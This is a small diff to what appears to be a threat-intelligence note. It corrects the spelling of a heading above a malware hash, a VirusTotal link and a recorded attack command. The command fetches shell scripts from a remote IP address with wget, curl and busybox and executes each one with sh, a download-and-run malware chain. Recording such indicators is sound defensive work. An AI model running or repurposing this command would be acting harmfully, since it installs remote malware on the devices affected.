@@ -11,7 +11,7 @@ Malware Download:
 020f1fa6072108c79ed6f553f4f8b08e157bf17f9c260a76353300230fed09f0
 https://www.virustotal.com/gui/file/020f1fa6072108c79ed6f553f4f8b08e157bf17f9c260a76353300230fed09f0
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 cd /data/local/tmp/; busybox wget http://103.188.244.189/w.sh; sh w.sh; curl http://103.188.244.189/c.sh; sh c.sh; wget http://103.188.244.189/wget.sh; sh wget.sh; curl http://103.188.244.189/wget.sh; sh wget.sh; busybox wget http://103.188.244.189/wget.sh; sh wget.sh; busybox curl http://103.188.244.189/wget.sh; sh wget.sh
 
